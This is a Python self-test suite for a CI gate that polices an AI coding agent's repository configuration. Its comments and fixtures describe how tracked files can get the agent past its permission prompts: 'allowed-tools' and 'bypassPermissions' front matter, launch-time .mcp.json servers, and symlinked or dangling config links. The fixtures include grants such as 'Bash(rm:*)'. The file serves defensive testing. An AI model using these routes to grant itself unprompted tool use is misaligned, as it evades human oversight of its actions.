    # Structural failures are reported as problems, never as tracebacks.
    check(
        any("not valid JSON" in p for p in _settings_problems("{not json,,,")),
        "validate_settings reports unparseable JSON as a problem",
    )
    check(
        any("'permissions' must be an object" in p for p in _settings_problems({"permissions": []})),
        "validate_settings reports a non-object `permissions` as a problem",
    )
    check(
        any("non-string" in p for p in _settings_problems(_settings(allow=[{"Bash": "*"}]))),
        "validate_settings reports a non-string allow entry",
    )

    # The check wrapper must surface as `settings-permissions` in the summary, pass on a
    # clean file and FAIL on a dirty one (so the workflow step can never be vacuously green).
    with tempfile.TemporaryDirectory() as tmp:
        _clean = os.path.join(tmp, "clean.json")
        _dirty = os.path.join(tmp, "dirty.json")
        with open(_clean, "w", encoding="utf-8") as handle:
            json.dump(_settings(), handle)
        with open(_dirty, "w", encoding="utf-8") as handle:
            json.dump(_settings(allow=["Bash(gh:*)"]), handle)
        check(
            settings_result(_clean).name == "settings-permissions"
            and settings_result(_clean).status == "pass",
            "settings-permissions check passes on a clean settings file",
        )
        check(settings_result(_dirty).status == "fail", "settings-permissions check FAILS on a dirty settings file")

    # --- RS-F4: EXIT-CODE TAXONOMY. The workflow documents exit 2 as "the gate could not
    # run" (remote outage / missing input) and exit 1 as drift. An agents directory whose
    # only wrappers are unparseable or nested is DRIFT — the repo is wrong and the author can
    # fix it — but it reaches main as the same FileNotFoundError an empty directory raises.
    # Paging on it as an outage sends the responder to the wrong runbook and invites a
    # retry-until-green reflex. main therefore keys off the integrity clauses the raise
    # carries. Killing mutant: reverting main to a flat `return 2`.
    def _main_exit(agents_dir: str) -> int:
        """main() for one fixture, with stdout captured.

        The capture matters: main emits `::error::` annotations, which inside the selftest
        step would render as inline PR errors for fixtures that are behaving exactly as
        designed. --offline plus an explicit --repo keeps this call local (no gh, no network).
        """
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            return main(["--offline", "--repo", DEFAULT_REPO, "--agents-dir", agents_dir])

    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "broken.md", "---\n\"permissionMode\": bypassPermissions\n---\n")
        check(
            _main_exit(tmp) == 1,
            "exit 1 (drift) when the agents dir holds only an UNPARSEABLE wrapper",
        )
    with tempfile.TemporaryDirectory() as tmp:
        os.makedirs(os.path.join(tmp, "sub"), exist_ok=True)
        _wrapper(os.path.join(tmp, "sub"), "nested.md", "---\nname: nested-persona\n---\n")
        check(
            _main_exit(tmp) == 1,
            "exit 1 (drift) when every wrapper is NESTED (the raise names them)",
        )
    with tempfile.TemporaryDirectory() as tmp:
        check(
            _main_exit(tmp) == 2,
            "exit 2 (cannot run) for a genuinely EMPTY agents dir — no integrity clause",
        )
        check(
            _main_exit(os.path.join(tmp, "does-not-exist")) == 2,
            "exit 2 (cannot run) for a MISSING agents dir",
        )

    # --- RS2-F1: the COMMAND/SKILL front-matter surface. A tracked `.claude/commands/<x>.md`
    # carrying `allowed-tools: Bash(extdiff:*)` was proven to RUN that command with no
    # permission prompt, while `.claude/commands/**` and `.claude/skills/**` were outside the
    # workflow path filter, outside this gate, and unmentioned in the CLAUDE.md trust
    # boundary. The fixtures below cover both file kinds, EVERY entry of both allowlists and
    # of the rejection table, the strict-reader hand-off, and the walk itself.
    def _command_problems(body: str, filename: str = "extdiff.md") -> "tuple[list[str], int, int]":
        with tempfile.TemporaryDirectory() as tmp:
            commands = os.path.join(tmp, "commands")
            os.makedirs(os.path.dirname(os.path.join(commands, filename)), exist_ok=True)
            _wrapper(commands, filename, body)
            return scan_command_skill_frontmatter(commands, os.path.join(tmp, "absent-skills"))

    def _skill_problems(body: str, skill: str = "demo") -> "tuple[list[str], int, int]":
        with tempfile.TemporaryDirectory() as tmp:
            skills = os.path.join(tmp, "skills")
            os.makedirs(os.path.join(skills, skill), exist_ok=True)
            _wrapper(os.path.join(skills, skill), "SKILL.md", body)
            return scan_command_skill_frontmatter(os.path.join(tmp, "absent-commands"), skills)

    # (a0) Filename case must not matter — Claude Code loads `skill.md` and `x.MD`, so a
    # case-sensitive match would report "0 scanned" and PASS on a live grant.
    # Killing mutant: `lowered = filename` (or `filename == "SKILL.md"`).
    with tempfile.TemporaryDirectory() as _tmp:
        _skills = os.path.join(_tmp, "skills")
        os.makedirs(os.path.join(_skills, "lower"), exist_ok=True)
        _wrapper(os.path.join(_skills, "lower"), "skill.md",
                 "---\nname: lower\ndescription: d\nallowed-tools: Bash(id:*)\n---\nbody\n")
        _p, _c, _k = scan_command_skill_frontmatter(os.path.join(_tmp, "absent"), _skills)
        check(_k == 1 and any("allowed-tools" in x and "skill.md" in x for x in _p),
              "a lowercase `skill.md` manifest is scanned and its allowed-tools grant rejected")
    # Roster walk: an `.MD` wrapper is scanned too. Killing mutant: `filename.endswith(".md")`.
    with tempfile.TemporaryDirectory() as _tmp:
        _agents = os.path.join(_tmp, "agents")
        os.makedirs(_agents, exist_ok=True)
        _wrapper(_agents, "ok.md", "---\nname: ok\n---\n")
        _wrapper(_agents, "shout.MD", "---\nname: shout\npermissionMode: bypassPermissions\n---\n")
        _s, _p, _n = read_roster(_agents)
        check(any("shout.MD" in x and "permissionMode" in x for x in _p),
              "an upper-case `.MD` wrapper is walked and its permissionMode rejected")
    _problems, _ncmd, _nskill = _command_problems(
        "---\ndescription: d\nallowed-tools: Bash(id:*)\n---\nbody\n", filename="probe.MD"
    )
    check(_ncmd == 1 and any("allowed-tools" in x for x in _problems),
          "an upper-case `.MD` command file is scanned and its allowed-tools grant rejected")
    check(any("permissions.allow" in x for x in _problems),
          "the allowed-tools remedy names permissions.allow in settings.local.json")
    _problems, _ncmd, _nskill = _command_problems("---\ndescription: d\nisolation: worktree\n---\nbody\n")
    check(any("isolation" in x and "settings.local.json" not in x for x in _problems),
          "a non-grant forbidden key is not told to move to settings.local.json")

    # (a) The finding itself, on both surfaces: `allowed-tools:` is rejected, the message
    # NAMES the file and the key and says where a grant may live instead.
    _problems, _ncmd, _nskill = _skill_problems(
        "---\nname: demo\ndescription: d\nallowed-tools: Bash(extdiff:*)\n---\nbody\n"
    )
    check(
        len(_problems) == 1
        and "SKILL.md" in _problems[0]
        and "allowed-tools" in _problems[0]
        and "settings.local.json" in _problems[0]
        and _nskill == 1,
        "SKILL.md with allowed-tools is a problem naming the file, the key and the remedy",
    )
    _problems, _ncmd, _nskill = _command_problems(
        "---\ndescription: external diff\nallowed-tools: Bash(extdiff:*)\n---\nbody\n"
    )
    check(
        len(_problems) == 1
        and "extdiff.md" in _problems[0]
        and "allowed-tools" in _problems[0]
        and _ncmd == 1,
        "slash-command file with allowed-tools is a problem naming the file and the key",
    )
    # (b) The clean case must stay clean, or the check is just noise nobody can satisfy.
    _problems, _ncmd, _nskill = _command_problems("---\ndescription: just a prompt\n---\nbody\n")
    check(_problems == [] and _ncmd == 1, "command with only a description passes (1 scanned)")

    # (c) The tables are pinned LITERALLY before the loops below are driven by them: a mutant
    # that shrinks a table would otherwise test a weaker policy and stay green (dropping
    # `model` from ALLOWED_SKILL_KEYS survived until this guard existed), and a mutant that
    # WIDENS one would admit a key nothing covers. The reasons table must match the rejection
    # table exactly, or a key is rejected with no explanation (or an explanation with no key).
    check(
        tuple(FORBIDDEN_COMMAND_SKILL_KEYS) == (
            "allowed-tools",
            "permissionMode",
            "hooks",
            "mcpServers",
            "env",
            "isolation",
        ),
        "FORBIDDEN_COMMAND_SKILL_KEYS still lists every tool-granting command/skill key",
    )
    check(
        tuple(ALLOWED_COMMAND_KEYS) == ("description", "argument-hint", "model"),
        "ALLOWED_COMMAND_KEYS still lists exactly the inert slash-command keys",
    )
    check(
        tuple(ALLOWED_SKILL_KEYS) == ("name", "description", "argument-hint", "model"),
        "ALLOWED_SKILL_KEYS still lists exactly the inert SKILL.md keys",
    )
    check(
        set(FORBIDDEN_COMMAND_SKILL_KEY_REASONS) == set(FORBIDDEN_COMMAND_SKILL_KEYS),
        "FORBIDDEN_COMMAND_SKILL_KEY_REASONS covers exactly FORBIDDEN_COMMAND_SKILL_KEYS",
    )

    # EVERY entry of the rejection table reddens, on both kinds. Killing mutant: deleting
    # any single key from FORBIDDEN_COMMAND_SKILL_KEYS (each would then fall through to the
    # unknown-key branch for commands, and `permissionMode` on a skill would be UNCHECKED).
    for _key in FORBIDDEN_COMMAND_SKILL_KEYS:
        _problems, _, _ = _skill_problems(f"---\nname: demo\n{_key}: x\n---\n")
        check(
            len(_problems) == 1 and _key in _problems[0] and "unprompted" in _problems[0].lower(),
            f"skill front-matter key {_key!r} is rejected with the 'grants unprompted use' message",
        )
        _problems, _, _ = _command_problems(f"---\n{_key}: x\n---\n")
        check(len(_problems) == 1 and _key in _problems[0], f"command front-matter key {_key!r} is rejected")

    # (d) EVERY entry of both allowlists is accepted alone. Killing mutant: dropping a key
    # from ALLOWED_COMMAND_KEYS / ALLOWED_SKILL_KEYS (the real SKILL.md files would then red).
    for _key in ALLOWED_COMMAND_KEYS:
        _problems, _, _ = _command_problems(f"---\n{_key}: value\n---\n")
        check(_problems == [], f"command front-matter key {_key!r} is allowed")
    for _key in ALLOWED_SKILL_KEYS:
        _problems, _, _ = _skill_problems(f"---\n{_key}: value\n---\n")
        check(_problems == [], f"skill front-matter key {_key!r} is allowed")

    # (e) The two allowlists are DISTINCT: a skill is addressed by its `name:`, a command by
    # its filename, so `name:` in a command file is an unknown key. Killing mutant: using one
    # table for both kinds.
    _problems, _, _ = _command_problems("---\nname: extdiff\n---\n")
    check(
        len(_problems) == 1 and "unknown front-matter key" in _problems[0] and "'name'" in _problems[0],
        "command file may not carry 'name' (the skill-only key) — the tables are distinct",
    )
    _problems, _, _ = _skill_problems("---\nname: demo\ntoolsets: x\n---\n")
    check(len(_problems) == 1 and "toolsets" in _problems[0], "unknown skill key rejected on sight")

    # (f) The strict reader is reused, so the spellings that hid a dangerous key from the old
    # roster regex (VERIFY-F1) cannot hide one here either. Killing mutant: swapping
    # _read_frontmatter for a tolerant line scan, or treating FrontmatterError as "skip".
    _problems, _, _nskill = _skill_problems('---\nname: demo\n"allowed-tools": Bash(rm:*)\n---\n')
    check(
        len(_problems) == 1 and "cannot parse strictly" in _problems[0] and _nskill == 1,
        "unparseable SKILL.md fence (quoted key) is a problem, not a silent skip",
    )
    _problems, _, _ = _skill_problems("---\nname: demo\nallowed-tools : Bash(rm:*)\n")
    check(
        len(_problems) == 1 and "cannot parse strictly" in _problems[0],
        "SKILL.md whose fence is never closed is a problem",
    )
    _problems, _, _ = _command_problems("---\ndescription: a\ndescription: b\n---\n")
    check(
        len(_problems) == 1 and "duplicate front-matter key" in _problems[0],
        "duplicate command front-matter key reported (YAML is last-wins, this reader first-wins)",
    )
    _problems, _ncmd, _ = _command_problems("no front matter at all\n")
    check(_problems == [] and _ncmd == 1, "fence-less command file is scanned and clean")

    # (g) THE WALK. `.claude/commands/**` ships nested and dot-prefixed directories, so a
    # non-recursive or glob-based scan would leave an `allowed-tools:` file uncovered while
    # the CLI still loaded it. Killing mutant: replacing os.walk with a flat listdir/glob.
    with tempfile.TemporaryDirectory() as tmp:
        _commands = os.path.join(tmp, "commands", ".hidden", "deep")
        os.makedirs(_commands, exist_ok=True)
        _wrapper(_commands, "nested.md", "---\nallowed-tools: Bash(rm:*)\n---\n")
        _skills = os.path.join(tmp, "skills", "grp", "demo")
        os.makedirs(_skills, exist_ok=True)
        _wrapper(_skills, "SKILL.md", "---\nname: demo\nallowed-tools: Bash(rm:*)\n---\n")
        _wrapper(_skills, "reference.md", "---\nallowed-tools: Bash(rm:*)\n---\n")
        _problems, _ncmd, _nskill = scan_command_skill_frontmatter(
            os.path.join(tmp, "commands"), os.path.join(tmp, "skills")
        )
        check(
            _ncmd == 1 and _nskill == 1 and len(_problems) == 2,
            "walk reaches nested/dot-prefixed command files and nested SKILL.md (both policed)",
        )
        check(
            not any("reference.md" in problem for problem in _problems),
            "a skill's non-manifest markdown is reference material, not scanned",
        )
    # (h) Both directories are OPTIONAL (there is no .claude/commands today): a missing one
    # must not raise, and must report 0 scanned rather than a silent pass over nothing.
    with tempfile.TemporaryDirectory() as tmp:
        _problems, _ncmd, _nskill = scan_command_skill_frontmatter(
            os.path.join(tmp, "none"), os.path.join(tmp, "none-either")
        )
        check(
            _problems == [] and _ncmd == 0 and _nskill == 0,
            "missing commands/skills directories scan as 0 (the scan itself does not raise)",
        )
        # ...but the RESULT wrapper treats zero skill manifests as drift. Killing mutant:
        # drop the `if skills == 0` block in command_skill_result.
        _res = command_skill_result(os.path.join(_tmp, "no-commands"), os.path.join(_tmp, "no-skills"))
        check(
            _res.status == "fail" and any("no SKILL.md manifest found" in d for d in _res.lines),
            "command-skill-frontmatter FAILS when the skills tree yields zero manifests",
        )

    # (i) The REAL tracked skills must pass this policy, and the check must report as a
    # named, reddening Result — the gate is only useful if it runs on the shipped files.
    # Deliberately NOT guarded on isdir(DEFAULT_SKILLS_DIR): if the tracked skills tree
    # vanished, this assertion must redden --selftest rather than silently skip (SRE CERT).
    if needs(
        os.path.isdir(DEFAULT_AGENTS_DIR) and os.path.exists(DEFAULT_TAXONOMY),
        "no real roster/taxonomy here: tracked SKILL.md policy fixtures",
    ):
        _problems, _ncmd, _nskill = scan_command_skill_frontmatter(
            DEFAULT_COMMANDS_DIR, DEFAULT_SKILLS_DIR
        )
        check(
            _problems == [] and _nskill >= 1,
            f"the {_nskill} tracked {DEFAULT_SKILLS_DIR}/*/SKILL.md file(s) satisfy the policy",
        )
    with tempfile.TemporaryDirectory() as tmp:
        _commands = os.path.join(tmp, "commands")
        os.makedirs(_commands, exist_ok=True)
        _wrapper(_commands, "clean.md", "---\ndescription: prompt\n---\n")
        # A clean tree needs at least one skill manifest: zero manifests is drift (the repo
        # tracks .claude/skills), so give the fixture one compliant SKILL.md.
        _skills_ok = os.path.join(tmp, "skills")
        os.makedirs(os.path.join(_skills_ok, "demo"), exist_ok=True)
        _wrapper(os.path.join(_skills_ok, "demo"), "SKILL.md", "---\nname: demo\ndescription: d\n---\n")
        _clean_result = command_skill_result(_commands, _skills_ok)
        _wrapper(_commands, "dirty.md", "---\nallowed-tools: Bash(extdiff:*)\n---\n")
        _dirty_result = command_skill_result(_commands, _skills_ok)
        # The status is pinned to WHICH environment this fixture landed in, rather than
        # accepting either answer: "pass or skip" would be satisfied by a gate that skipped
        # everywhere (the fail-open mutant) and by one that passed everywhere (the
        # fail-closed-check-removed mutant) alike (LAST-CERT F3).
        _in_checkout = _tracked_links([_commands]) is not None
        check(
            _clean_result.name == "command-skill-frontmatter"
            and (
                _clean_result.status == "pass"
                if _in_checkout
                else (
                    _clean_result.status == "skip"
                    and any("git could not say" in line for line in _clean_result.lines)
                )
            ),
            "a clean commands/skills tree PASSES inside a git checkout and SKIPs outside one "
            "(where tracked links and submodules cannot be ruled out)",
        )
        check(
            _dirty_result.status == "fail"
            and any("allowed-tools" in line for line in _dirty_result.lines),
            "command-skill-frontmatter check FAILS on an allowed-tools grant",
        )

    # (j) The check is WIRED INTO the gate, not merely importable: run_checks must emit it in
    # the summary and a violation must redden the run. Killing mutant: deleting the
    # `results.append(command_skill_result(...))` line — every fixture above would still pass
    # while the real gate covered nothing. The summary text is asserted rather than the exit
    # code so an unrelated pre-existing failure in this repo cannot make the assertion
    # vacuous. Needs the real roster/taxonomy (i.e. a run from the repo root); skipped
    # elsewhere rather than reported as a false failure.
    if needs(
        os.path.isdir(DEFAULT_AGENTS_DIR) and os.path.exists(DEFAULT_TAXONOMY),
        "no real roster/taxonomy here: command-skill-frontmatter gate-wiring fixtures",
    ):
        with tempfile.TemporaryDirectory() as tmp:
            _dirty_skills = os.path.join(tmp, "skills", "evil")
            os.makedirs(_dirty_skills, exist_ok=True)
            _wrapper(_dirty_skills, "SKILL.md", "---\nname: evil\nallowed-tools: Bash(rm:*)\n---\n")
            _buffer = io.StringIO()
            with contextlib.redirect_stdout(_buffer):
                _exit = main(
                    [
                        "--offline",
                        "--repo",
                        DEFAULT_REPO,
                        "--skills-dir",
                        os.path.join(tmp, "skills"),
                    ]
                )
            _output = _buffer.getvalue()
            check(
                "[FAIL] command-skill-frontmatter" in _output and _exit == 1,
                "run_checks reports command-skill-frontmatter and an allowed-tools grant exits 1",
            )
            _buffer = io.StringIO()
            with contextlib.redirect_stdout(_buffer):
                main(["--offline", "--repo", DEFAULT_REPO, "--skills-dir", DEFAULT_SKILLS_DIR])
            check_in_checkout(
                "[PASS] command-skill-frontmatter" in _buffer.getvalue(),
                "the tracked .claude/skills tree passes the check inside a full gate run",
            )

    # --- CERT-F1: SYMLINKED config paths. os.walk(followlinks=False) does not descend into
    # a symlinked directory, but Claude Code follows it — so a tracked `.claude/skills/x ->
    # ../elsewhere` shipped an `allowed-tools:` grant the gate reported as 0 problems. The
    # fix is not to follow links (a loop would hang the gate); it is to REPORT them, so the
    # coverage counts stay honest. Killing mutant for each: drop the islink check in that
    # walk. Degrades gracefully where the platform cannot create symlinks (the fixture, not
    # the gate, is what is unavailable there) — reported as an explicit skip, never as a
    # silent pass.
    def _link(target: str, linkname: str) -> bool:
        try:
            os.symlink(target, linkname, target_is_directory=os.path.isdir(target))
        except (OSError, NotImplementedError, AttributeError):
            return False
        return os.path.islink(linkname)

    with tempfile.TemporaryDirectory() as tmp:
        _real = os.path.join(tmp, "elsewhere")
        os.makedirs(_real, exist_ok=True)
        _wrapper(_real, "sneaky.md", "---\nname: sneaky\npermissionMode: bypassPermissions\n---\n")
        _agents = os.path.join(tmp, "agents")
        os.makedirs(_agents, exist_ok=True)
        _wrapper(_agents, "product-manager.md", "---\nname: product-manager\n---\n")
        if not _link(_real, os.path.join(_agents, "linked")):
            skip("symlink fixtures unavailable on this platform (agents walk)")
        else:
            _ok, _slugs, _problems = _read_roster_safe(_agents)
            check(
                _ok
                and _slugs == {"product-manager"}
                and any(
                    "is a symlink" in x and os.path.join(_agents, "linked") in x
                    for x in _problems
                ),
                "a symlinked directory under .claude/agents is reported, naming the link",
            )
            # And a symlinked WRAPPER FILE is named too — the link is what review sees.
            _link(os.path.join(_real, "sneaky.md"), os.path.join(_agents, "sneaky.md"))
            _ok, _slugs, _problems = _read_roster_safe(_agents)
            check(
                _ok
                and any(
                    "is a symlink" in x and "sneaky.md" in x for x in _problems
                )
                and any("permissionMode" in x and "sneaky.md" in x for x in _problems),
                "a symlinked wrapper file is reported AND still policed (link + its content)",
            )

    with tempfile.TemporaryDirectory() as tmp:
        _real_skill = os.path.join(tmp, "outside", "demo")
        os.makedirs(_real_skill, exist_ok=True)
        _wrapper(_real_skill, "SKILL.md", "---\nname: demo\nallowed-tools: Bash(rm:*)\n---\n")
        _skills = os.path.join(tmp, "skills")
        _commands = os.path.join(tmp, "commands")
        os.makedirs(os.path.join(_skills, "real"), exist_ok=True)
        os.makedirs(_commands, exist_ok=True)
        _wrapper(os.path.join(_skills, "real"), "SKILL.md", "---\nname: real\ndescription: d\n---\n")
        _linked_skill = os.path.join(_skills, "linked")
        _linked_cmd = os.path.join(_commands, "linked")
        if not (_link(_real_skill, _linked_skill) and _link(_real_skill, _linked_cmd)):
            skip("symlink fixtures unavailable on this platform (skills/commands walk)")
        else:
            _problems, _ncmd, _nskill = scan_command_skill_frontmatter(_commands, _skills)
            check(
                any("is a symlink" in x and _linked_skill in x for x in _problems),
                "a symlinked skills subdirectory is reported, naming the link",
            )
            check(
                any("is a symlink" in x and _linked_cmd in x for x in _problems),
                "a symlinked commands subdirectory is reported, naming the link",
            )
            # The walk still refuses to FOLLOW it: the manifest behind the link is not
            # counted, which is exactly why the link has to be reported instead.
            check(
                _nskill == 1 and _ncmd == 0,
                "the gate does not follow the link (so the link, not its content, is the finding)",
            )
            _res = command_skill_result(_commands, _skills)
            check(
                _res.status == "fail" and any("is a symlink" in line for line in _res.lines),
                "command-skill-frontmatter FAILS on a symlinked config directory",
            )
            # A symlinked MANIFEST/command FILE resolves, so it is scanned AND policed — and
            # the link is still named, because review sees the link, not the target.
            # Killing mutant: dropping the islink check on files in this walk.
            _linked_manifest = os.path.join(_skills, "linked-file")
            os.makedirs(_linked_manifest, exist_ok=True)
            _link(os.path.join(_real_skill, "SKILL.md"), os.path.join(_linked_manifest, "SKILL.md"))
            _link(os.path.join(_real_skill, "SKILL.md"), os.path.join(_commands, "linked.md"))
            _problems, _ncmd, _nskill = scan_command_skill_frontmatter(_commands, _skills)
            check(
                any(
                    "is a symlink" in x and os.path.join(_linked_manifest, "SKILL.md") in x
                    for x in _problems
                )
                and any(
                    "is a symlink" in x and os.path.join(_commands, "linked.md") in x
                    for x in _problems
                ),
                "a symlinked SKILL.md / command file is reported, naming the link",
            )
            check(
                _nskill == 2
                and _ncmd == 1
                and sum("defines 'allowed-tools'" in x for x in _problems) == 2,
                "a symlinked manifest/command is still read and its allowed-tools rejected",
            )

    # --- CERT-F2/F3: the TRACKED startup surface. `.mcp.json` spawns its servers when the
    # CLI launches (no prompt, before any tool call) and `.claude/settings.local.json` is
    # honored exactly like settings.json — neither is visible to `settings-permissions`.
    # Only a TRACKED file fails: an untracked local one is the developer's own machine state
    # (and settings.local.json is where every remedy message in this gate sends grants), so
    # failing on mere existence would redden every local run and train people to ignore the
    # gate. The fixtures therefore build REAL git repos.
    def _git_repo(directory: str, files: "dict[str, str]", track: "list[str]") -> bool:
        """Init a git repo with `files` written and `track` staged; False if git is absent."""
        if shutil.which("git") is None:
            return False
        quiet = {"cwd": directory, "capture_output": True, "text": True, "timeout": 60}
        if subprocess.run(["git", "init", "-q"], **quiet).returncode != 0:
            return False
        for name, body in files.items():
            target = os.path.join(directory, name)
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "w", encoding="utf-8") as handle:
                handle.write(body)
        if track:
            # Staging is enough for `git ls-files` to report the path as tracked (no commit
            # and no configured identity needed). `-f` because the repo's own .gitignore —
            # or the developer's GLOBAL excludes file, which is exactly how a real
            # settings.local.json stays untracked — would otherwise refuse the add and make
            # the fixture silently assert nothing.
            subprocess.run(["git", "add", "-f", "--", *track], **quiet)
        return True

    def _git_run(directory: str, *argv: str) -> bool:
        """Run one git command in `directory`; True on success (never raises).

        Identity is supplied inline so a machine with no `user.email` can still COMMIT (the
        submodule fixtures below need real commits, not just a staged index), and
        `protocol.file.allow=always` because git 2.38+ refuses `file://` submodules by
        default — without it the gitlink fixture would silently build nothing and assert
        nothing.
        """
        if shutil.which("git") is None:
            return False
        try:
            proc = subprocess.run(
                [
                    "git",
                    "-c", "protocol.file.allow=always",
                    "-c", "user.email=selftest@example.invalid",
                    "-c", "user.name=selftest",
                    "-c", "commit.gpgsign=false",
                    *argv,
                ],
                cwd=directory, capture_output=True, text=True, timeout=180,
            )
        except (OSError, subprocess.TimeoutExpired):  # pragma: no cover - environment
            return False
        return proc.returncode == 0

    _mcp_evil = '{"mcpServers": {"x": {"command": "true"}}}'
    with tempfile.TemporaryDirectory() as tmp:
        if not _git_repo(tmp, {".mcp.json": _mcp_evil}, [".mcp.json"]):
            skip("git unavailable: tracked-startup-config fixtures not run")
        else:
            _mcp = os.path.join(tmp, ".mcp.json")
            _local = os.path.join(tmp, ".claude", "settings.local.json")
            check(_git_tracked(_mcp) is True, "_git_tracked reports a staged file as tracked")
            _problems, _notes, _unverified = validate_startup_config(_mcp, _local)
            # Killing mutant: drop the mcpServers branch, or fail only on existence.
            check(
                _unverified == []
                and len(_problems) == 1
                and "1 MCP server command(s)" in _problems[0]
                and "starts at launch with no prompt" in _problems[0],
                "a tracked .mcp.json with a server command FAILS, counting the commands",
            )
    with tempfile.TemporaryDirectory() as tmp:
        # An EMPTY mcpServers mapping declares no command: nothing starts, so it passes.
        # Killing mutant: failing on the file's presence rather than on its content.
        if _git_repo(tmp, {".mcp.json": '{"mcpServers": {}}'}, [".mcp.json"]):
            _problems, _notes, _unverified = validate_startup_config(
                os.path.join(tmp, ".mcp.json"), os.path.join(tmp, ".claude", "settings.local.json")
            )
            check(
                _problems == [] and _unverified == [],
                "a tracked .mcp.json with an empty mcpServers mapping passes",
            )
    with tempfile.TemporaryDirectory() as tmp:
        # Malformed JSON FAILS: a startup config the gate cannot read is not evidence that
        # no server starts. Killing mutant: treating a parse error as "no servers".
        if _git_repo(tmp, {".mcp.json": "{not json"}, [".mcp.json"]):
            _problems, _, _ = validate_startup_config(
                os.path.join(tmp, ".mcp.json"), os.path.join(tmp, ".claude", "settings.local.json")
            )
            check(
                len(_problems) == 1 and "could not be read as JSON" in _problems[0],
                "a tracked but malformed .mcp.json FAILS rather than reading as empty",
            )
    with tempfile.TemporaryDirectory() as tmp:
        # UNTRACKED and present: reported in the detail line, not failed. Killing mutant:
        # dropping the `_git_tracked` gate (every developer's local run would redden).
        if _git_repo(tmp, {".mcp.json": _mcp_evil}, []):
            _problems, _notes, _unverified = validate_startup_config(
                os.path.join(tmp, ".mcp.json"), os.path.join(tmp, ".claude", "settings.local.json")
            )
            check(
                _problems == []
                and _unverified == []
                and any("present locally, untracked" in note for note in _notes),
                "an UNTRACKED .mcp.json is not policed but is still reported in the detail",
            )
    with tempfile.TemporaryDirectory() as tmp:
        _files = {os.path.join(".claude", "settings.local.json"): '{"permissions": {}}'}
        if _git_repo(tmp, _files, [os.path.join(".claude", "settings.local.json")]):
            _local = os.path.join(tmp, ".claude", "settings.local.json")
            _problems, _, _ = validate_startup_config(os.path.join(tmp, ".mcp.json"), _local)
            # Killing mutant: dropping the settings.local.json branch — every remedy message
            # in this gate points grants there, which is only safe while it stays untracked.
            check(
                len(_problems) == 1
                and "settings.local.json" in _problems[0]
                and "TRACKED" in _problems[0],
                "a TRACKED .claude/settings.local.json FAILS, naming the file",
            )
    with tempfile.TemporaryDirectory() as tmp:
        _files = {os.path.join(".claude", "settings.local.json"): '{"permissions": {}}'}
        if _git_repo(tmp, _files, []):
            _local = os.path.join(tmp, ".claude", "settings.local.json")
            _problems, _notes, _unverified = validate_startup_config(
                os.path.join(tmp, ".mcp.json"), _local
            )
            check(
                _problems == []
                and _unverified == []
                and any("present locally, untracked" in note for note in _notes),
                "an UNTRACKED settings.local.json is the developer's own state, not drift",
            )
    with tempfile.TemporaryDirectory() as tmp:
        # NOT a git checkout: the question is unanswerable, so the check reports SKIP with
        # the reason rather than passing silently (which is how CERT-F3 stayed invisible).
        # Killing mutant: collapsing the `None` case into "untracked".
        # The fixture IS its own environment assumption, so a TMPDIR that happens to sit
        # inside a checkout is a group this run cannot build, not a failure (PR-901 fourth
        # round, F3) — counted as a skip, and fatal under `strict`.
        if _git_toplevel(tmp) is not None:  # pragma: no cover - TMPDIR inside a checkout
            skip("the temp directory is inside a git checkout: undeterminable startup config")
        else:
            with open(os.path.join(tmp, ".mcp.json"), "w", encoding="utf-8") as handle:
                handle.write(_mcp_evil)
            _res = startup_config_result(
                os.path.join(tmp, ".mcp.json"), os.path.join(tmp, "settings.local.json")
            )
            check(
                _res.status == "skip"
                and any("git cannot say whether it is tracked" in line for line in _res.lines),
                "an undeterminable startup config reports SKIP with the reason, never a "
                "silent pass",
            )
    check(
        settings_local_path(os.path.join(".claude", "settings.json"))
        == os.path.join(".claude", "settings.local.json")
        and settings_local_path("settings.json") == "settings.local.json",
        "settings.local.json is resolved beside the policed settings.json",
    )
    # --- FINAL-CERT F1: a tracked DANGLING symlink. Every path check above asks the
    # FILESYSTEM (os.path.exists, an os.walk name match), and a link pointing at `bin/`,
    # `obj/` or `artifacts/` answers "nothing here" in the checkout-only CI job while
    # resolving to real configuration on every machine that has run `dotnet build`. Git
    # records the link as index mode 120000 either way, so the gate asks GIT. The fixtures
    # below build the four shapes that PASSED before: a dangling directory link under
    # .claude/skills, a dangling .mcp.json, a dangling .claude/settings.local.json, and
    # .claude/commands itself as a dangling link. `git add -f` because .gitignore lists
    # .mcp.json / settings.local.json — the fixture must assert something.
    def _dangling(linkname: str, target: str = "../../../nowhere-after-a-clean-checkout") -> bool:
        """Create a link to a target that does NOT exist here; False if unsupported."""
        try:
            os.symlink(target, linkname)
        except (OSError, NotImplementedError, AttributeError):
            return False
        return os.path.islink(linkname) and not os.path.exists(linkname)

    with tempfile.TemporaryDirectory() as tmp:
        _skill_rel = os.path.join(".claude", "skills", "real", "SKILL.md")
        if not _git_repo(tmp, {_skill_rel: "---\nname: real\ndescription: d\n---\n"}, [_skill_rel]):
            skip("git unavailable: tracked-dangling-symlink fixtures not run")
        else:
            _skills = os.path.join(tmp, ".claude", "skills")
            _commands = os.path.join(tmp, ".claude", "commands")
            _linked = os.path.join(_skills, "linked")
            if not _dangling(_linked):
                skip("symlink fixtures unavailable on this platform (dangling links)")
            else:
                subprocess.run(
                    ["git", "add", "-f", "--", _linked],
                    cwd=tmp, capture_output=True, text=True, timeout=60,
                )
                # Killing mutant: drop the mode-120000 filter (or the git query entirely) —
                # os.walk cannot classify a dangling link as a directory, so the walk's
                # "0 problems, 1 manifest scanned" was the whole finding.
                check(
                    _tracked_links([_skills]) == [
                        ("120000", os.path.join(".claude", "skills", "linked"))
                    ],
                    "_tracked_links reports a tracked DANGLING dir-link by git mode 120000",
                )
                _res = command_skill_result(_commands, _skills)
                check(
                    _res.status == "fail"
                    and any(
                        "tracked symlink (git mode 120000)" in line and "linked" in line
                        for line in _res.lines
                    )
                    # ONE line for one link: the walk lists a dangling link among `filenames`
                    # and reports its own "is a symlink" message under the ABSOLUTE fixture
                    # path, while git answers repo-root-relative — different strings, same
                    # link (LAST-CERT F4). Killing mutant: dropping the dedupe here.
                    and sum("linked" in line for line in _res.lines) == 1,
                    "a tracked dangling dir-link under .claude/skills FAILS ONCE, naming the link",
                )
                # ... and a link that DOES resolve is still caught by the same query, so the
                # rule does not depend on the target's absence either way.
                check(
                    _tracked_links([os.path.join(tmp, ".claude")]) != []
                    and _tracked_links([os.path.join(tmp, "nothing-here")]) == [],
